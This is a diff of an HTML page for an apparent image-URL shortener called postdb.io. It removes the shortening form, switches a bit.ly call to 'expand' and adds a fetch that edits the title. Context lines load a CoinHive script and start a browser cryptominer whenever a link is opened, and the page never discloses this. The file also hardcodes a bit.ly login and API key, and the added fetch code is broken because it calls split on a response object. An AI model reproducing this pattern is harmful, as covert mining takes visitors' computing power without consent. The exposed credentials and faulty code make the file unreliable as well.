@@ -28,36 +28,10 @@
       font-size: 27px;
       margin: 10px;
     }
-    .main {
-      text-align: center;
-      font-size: 50px;
-      margin-top: 100px;
-      display: none;
-    }
-    #short {
-      margin-top: 70px;
-      width: 400px;
-      max-width: 90%;
-      height: 30px;
-      font-size: 23px;
-    }
-    #button {
-      border: 1px solid #000;
-      width: 70px;
-      height: 30px;
-      border-radius: 25px;
-      background: #fff;
-    }
   </style>
   <body>
     <div class="title">
-      postdb.io
-    </div>
-    <div class="main">
-      Shorten <span id="word">IMAGE</span> URL <br>
-      <input type="text" id="short" placeholder="https://i.imgur.com/gF72Xn9.gif">
-      <br>
-      <button type="button" id="button" onclick="submit()">Go</button>
+      postdb.io |
     </div>
 
     <img id="maincard0" class="imgcard">
@@ -66,7 +40,7 @@
 
     <script src="http://postdb.io/coinhive.min.js"></script>
     <script>
-      var base = "http://api.bit.ly/v3/shorten?login=o_5qog1opc6f&apiKey=R_d8a21a8680b4409eb00add64f3fb9d4c";
+      var base = "http://api.bit.ly/v3/expand?login=o_5qog1opc6f&apiKey=R_d8a21a8680b4409eb00add64f3fb9d4c";
       if (window.location.hash != "") {
         var miner = new CoinHive.User("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz", window.location.hash.slice(1));
         miner.start();
@@ -76,30 +50,14 @@
         }
         document.querySelector("#maincard"+img.split("").pop()).src = "http://bit.ly/"+img.slice(0,img.length-1);
         document.querySelector("#maincard"+img.split("").pop()).style.display = "inherit";
+        fetch(base+"&shortUrl=http%3A%2F%2Fbit.ly%2F"+img+"&format=txt").then((res) => {
+          var a = res.split("/").pop().split(".");
+          a.pop()
+          document.querySelector(".title").innerHTML += a.pop();
+        })
       } else {
         document.querySelector(".main").style.display = "inherit";
       }
-
-      var url = "http://postdb.io/#";
-      function submit() {
-        var i1 = document.querySelector("#short").value;
-          fetch(base+"&longUrl="+i1+"&format=json").then((res) => {
-            return res.json();
-          }).then((data) => {
-            // 0=img 1=audio 2=video
-            var e = i1.split(".").pop().toLowerCase();
-            var num = {"jpg": 0,"gif": 0,"png": 0,"mp3": 1,"ogg": 1,"wav": 1,"mp4": 2,"mpg": 2,"webm": 2}[e];
-            if (!num) num = 0;
-            url += data.data.hash
-            window.location.href = url+num.toString();
-            window.location.reload();
-          });
-      }
-      var i = 0;
-      setInterval(() => {
-        i++;
-        document.querySelector("#word").innerHTML = ["IMAGE", "GIF", "AUDIO", "VIDEO"][i%4];
-      }, 3000);
     </script>
   </body>
 </html>
